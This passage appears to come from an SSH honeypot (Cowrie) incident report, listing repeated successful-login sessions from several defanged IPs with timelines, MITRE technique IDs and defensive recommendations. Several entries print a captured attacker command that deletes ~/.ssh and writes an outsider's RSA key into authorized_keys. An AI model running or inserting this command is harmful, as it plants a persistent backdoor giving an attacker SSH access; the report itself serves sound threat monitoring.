|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:26 |
| **Last Seen** | 2026-04-14 12:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:26:21` | `cowrie.session.connect` |
| `2026-04-14 12:26:21` | `cowrie.client.version` |
| `2026-04-14 12:26:21` | `cowrie.client.kex` |
| `2026-04-14 12:26:22` | `cowrie.login.success` |
| `2026-04-14 12:26:22` | `cowrie.session.params` |
| `2026-04-14 12:26:22` | `cowrie.command.input` |
| `2026-04-14 12:26:22` | `cowrie.command.failed` |
| `2026-04-14 12:26:22` | `cowrie.log.closed` |
| `2026-04-14 12:26:23` | `cowrie.session.params` |
| `2026-04-14 12:26:23` | `cowrie.command.input` |
| `2026-04-14 12:26:23` | `cowrie.session.file_download` |
| `2026-04-14 12:26:23` | `cowrie.log.closed` |
| `2026-04-14 12:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e324ab3b7cb3

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:26 |
| **Last Seen** | 2026-04-14 12:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:26:25` | `cowrie.session.connect` |
| `2026-04-14 12:26:25` | `cowrie.client.version` |
| `2026-04-14 12:26:25` | `cowrie.client.kex` |
| `2026-04-14 12:26:26` | `cowrie.login.success` |
| `2026-04-14 12:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a17f8bd8a562

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:27 |
| **Last Seen** | 2026-04-14 12:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:27:46` | `cowrie.session.connect` |
| `2026-04-14 12:27:46` | `cowrie.client.version` |
| `2026-04-14 12:27:46` | `cowrie.client.kex` |
| `2026-04-14 12:27:47` | `cowrie.login.success` |
| `2026-04-14 12:27:48` | `cowrie.session.params` |
| `2026-04-14 12:27:48` | `cowrie.command.input` |
| `2026-04-14 12:27:48` | `cowrie.command.failed` |
| `2026-04-14 12:27:48` | `cowrie.log.closed` |
| `2026-04-14 12:27:49` | `cowrie.session.params` |
| `2026-04-14 12:27:49` | `cowrie.command.input` |
| `2026-04-14 12:27:49` | `cowrie.session.file_download` |
| `2026-04-14 12:27:49` | `cowrie.log.closed` |
| `2026-04-14 12:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22864f10dbc

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:27 |
| **Last Seen** | 2026-04-14 12:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:27:53` | `cowrie.session.connect` |
| `2026-04-14 12:27:53` | `cowrie.client.version` |
| `2026-04-14 12:27:53` | `cowrie.client.kex` |
| `2026-04-14 12:27:55` | `cowrie.login.success` |
| `2026-04-14 12:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c16ed68695d

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:28 |
| **Last Seen** | 2026-04-14 12:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:28:01` | `cowrie.session.connect` |
| `2026-04-14 12:28:01` | `cowrie.client.version` |
| `2026-04-14 12:28:01` | `cowrie.client.kex` |
| `2026-04-14 12:28:02` | `cowrie.login.success` |
| `2026-04-14 12:28:02` | `cowrie.session.params` |
| `2026-04-14 12:28:02` | `cowrie.command.input` |
| `2026-04-14 12:28:02` | `cowrie.command.failed` |
| `2026-04-14 12:28:02` | `cowrie.log.closed` |
| `2026-04-14 12:28:03` | `cowrie.session.params` |
| `2026-04-14 12:28:03` | `cowrie.command.input` |
| `2026-04-14 12:28:03` | `cowrie.session.file_download` |
| `2026-04-14 12:28:03` | `cowrie.log.closed` |
| `2026-04-14 12:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca295d8937ef

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:28 |
| **Last Seen** | 2026-04-14 12:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:28:04` | `cowrie.session.connect` |
| `2026-04-14 12:28:04` | `cowrie.client.version` |
| `2026-04-14 12:28:04` | `cowrie.client.kex` |
| `2026-04-14 12:28:05` | `cowrie.login.success` |
| `2026-04-14 12:28:05` | `cowrie.session.params` |
| `2026-04-14 12:28:05` | `cowrie.command.input` |
| `2026-04-14 12:28:05` | `cowrie.command.failed` |
| `2026-04-14 12:28:05` | `cowrie.log.closed` |
| `2026-04-14 12:28:05` | `cowrie.session.params` |
| `2026-04-14 12:28:05` | `cowrie.command.input` |
| `2026-04-14 12:28:05` | `cowrie.session.file_download` |
| `2026-04-14 12:28:05` | `cowrie.log.closed` |
| `2026-04-14 12:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6cd8f1d7a6

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:28 |
| **Last Seen** | 2026-04-14 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:28:05` | `cowrie.session.connect` |
| `2026-04-14 12:28:05` | `cowrie.client.version` |
| `2026-04-14 12:28:05` | `cowrie.client.kex` |
| `2026-04-14 12:28:06` | `cowrie.login.success` |
| `2026-04-14 12:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-904d70819eba

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:28 |
| **Last Seen** | 2026-04-14 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:28:08` | `cowrie.session.connect` |
| `2026-04-14 12:28:08` | `cowrie.client.version` |
| `2026-04-14 12:28:08` | `cowrie.client.kex` |
| `2026-04-14 12:28:08` | `cowrie.login.success` |
| `2026-04-14 12:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ace49196a8

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:28 |
| **Last Seen** | 2026-04-14 12:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:28:51` | `cowrie.session.connect` |
| `2026-04-14 12:28:51` | `cowrie.client.version` |
| `2026-04-14 12:28:52` | `cowrie.client.kex` |
| `2026-04-14 12:28:53` | `cowrie.login.success` |
| `2026-04-14 12:28:53` | `cowrie.session.params` |
| `2026-04-14 12:28:53` | `cowrie.command.input` |
| `2026-04-14 12:28:53` | `cowrie.command.failed` |
| `2026-04-14 12:28:53` | `cowrie.log.closed` |
| `2026-04-14 12:28:54` | `cowrie.session.params` |
| `2026-04-14 12:28:54` | `cowrie.command.input` |
| `2026-04-14 12:28:54` | `cowrie.session.file_download` |
| `2026-04-14 12:28:54` | `cowrie.log.closed` |
| `2026-04-14 12:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-882a9fc6b8d3

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:28 |
| **Last Seen** | 2026-04-14 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:28:57` | `cowrie.session.connect` |
| `2026-04-14 12:28:57` | `cowrie.client.version` |
| `2026-04-14 12:28:57` | `cowrie.client.kex` |
| `2026-04-14 12:28:58` | `cowrie.login.success` |
| `2026-04-14 12:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689b31ea4719

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:29 |
| **Last Seen** | 2026-04-14 12:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:29:38` | `cowrie.session.connect` |
| `2026-04-14 12:29:38` | `cowrie.client.version` |
| `2026-04-14 12:29:39` | `cowrie.client.kex` |
| `2026-04-14 12:29:40` | `cowrie.login.success` |
| `2026-04-14 12:29:41` | `cowrie.session.params` |
| `2026-04-14 12:29:41` | `cowrie.command.input` |
| `2026-04-14 12:29:41` | `cowrie.command.failed` |
| `2026-04-14 12:29:41` | `cowrie.log.closed` |
| `2026-04-14 12:29:42` | `cowrie.session.params` |
| `2026-04-14 12:29:42` | `cowrie.command.input` |
| `2026-04-14 12:29:42` | `cowrie.session.file_download` |
| `2026-04-14 12:29:42` | `cowrie.log.closed` |
| `2026-04-14 12:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4704126efc4e

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:29 |
| **Last Seen** | 2026-04-14 12:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:29:46` | `cowrie.session.connect` |
| `2026-04-14 12:29:46` | `cowrie.client.version` |
| `2026-04-14 12:29:46` | `cowrie.client.kex` |
| `2026-04-14 12:29:47` | `cowrie.login.success` |
| `2026-04-14 12:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56245189a9db

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:29 |
| **Last Seen** | 2026-04-14 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:29:48` | `cowrie.session.connect` |
| `2026-04-14 12:29:48` | `cowrie.client.version` |
| `2026-04-14 12:29:49` | `cowrie.client.kex` |
| `2026-04-14 12:29:49` | `cowrie.login.success` |
| `2026-04-14 12:29:49` | `cowrie.session.params` |
| `2026-04-14 12:29:49` | `cowrie.command.input` |
| `2026-04-14 12:29:49` | `cowrie.command.failed` |
| `2026-04-14 12:29:49` | `cowrie.log.closed` |
| `2026-04-14 12:29:50` | `cowrie.session.params` |
| `2026-04-14 12:29:50` | `cowrie.command.input` |
| `2026-04-14 12:29:50` | `cowrie.session.file_download` |
| `2026-04-14 12:29:50` | `cowrie.log.closed` |
| `2026-04-14 12:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088d6ebdc7fd

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:29 |
| **Last Seen** | 2026-04-14 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:29:52` | `cowrie.session.connect` |
| `2026-04-14 12:29:52` | `cowrie.client.version` |
| `2026-04-14 12:29:52` | `cowrie.client.kex` |
| `2026-04-14 12:29:53` | `cowrie.login.success` |
| `2026-04-14 12:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-048500c449aa

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:30 |
| **Last Seen** | 2026-04-14 12:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:30:36` | `cowrie.session.connect` |
| `2026-04-14 12:30:36` | `cowrie.client.version` |
| `2026-04-14 12:30:36` | `cowrie.client.kex` |
| `2026-04-14 12:30:37` | `cowrie.login.success` |
| `2026-04-14 12:30:38` | `cowrie.session.params` |
| `2026-04-14 12:30:38` | `cowrie.command.input` |
| `2026-04-14 12:30:38` | `cowrie.command.failed` |
| `2026-04-14 12:30:38` | `cowrie.log.closed` |
| `2026-04-14 12:30:39` | `cowrie.session.params` |
| `2026-04-14 12:30:39` | `cowrie.command.input` |
| `2026-04-14 12:30:39` | `cowrie.session.file_download` |
| `2026-04-14 12:30:39` | `cowrie.log.closed` |
| `2026-04-14 12:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110a55629a6f

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:30 |
| **Last Seen** | 2026-04-14 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:30:42` | `cowrie.session.connect` |
| `2026-04-14 12:30:42` | `cowrie.client.version` |
| `2026-04-14 12:30:42` | `cowrie.client.kex` |
| `2026-04-14 12:30:43` | `cowrie.login.success` |
| `2026-04-14 12:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d407c43f5ba0

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:31 |
| **Last Seen** | 2026-04-14 12:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:31:30` | `cowrie.session.connect` |
| `2026-04-14 12:31:30` | `cowrie.client.version` |
